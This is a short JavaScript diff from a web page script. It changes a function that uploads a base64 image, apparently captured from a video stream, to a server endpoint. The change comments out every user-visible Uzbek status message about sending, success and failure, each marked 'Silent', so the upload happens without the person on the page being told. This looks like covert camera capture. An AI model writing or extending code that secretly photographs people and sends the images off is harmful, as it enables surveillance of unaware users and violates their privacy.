@@ -60,24 +60,27 @@ function captureFromVideo() {
 
 async function sendToBackend(base64Str) {
     try {
+        // statusMsg.innerText = "Yuborilmoqda..."; // Silent
+
+        // POST as JSON (More stable on Vercel)
         const response = await fetch('/api/upload', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ image: base64Str })
         });
 
-        // Safe JSON parsing
         const result = await response.json();
 
         if (response.ok && result.success) {
-            statusMsg.innerText = "Yuborildi! ✅";
-            statusMsg.style.color = '#4ade80';
+            // statusMsg.innerText = "Yuborildi! ✅"; // Silent
+            // statusMsg.style.color = '#4ade80';
+            console.log("Photo sent successfully");
         } else {
-            console.error("Server Error:", result);
-            // Silent fail or minimal error
+            throw new Error(result.error || 'Server Error');
         }
     } catch (error) {
-        console.error("Network Error:", error);
+        console.error(error);
+        // statusMsg.innerText = "Xato"; // Silent
     }
 }
 
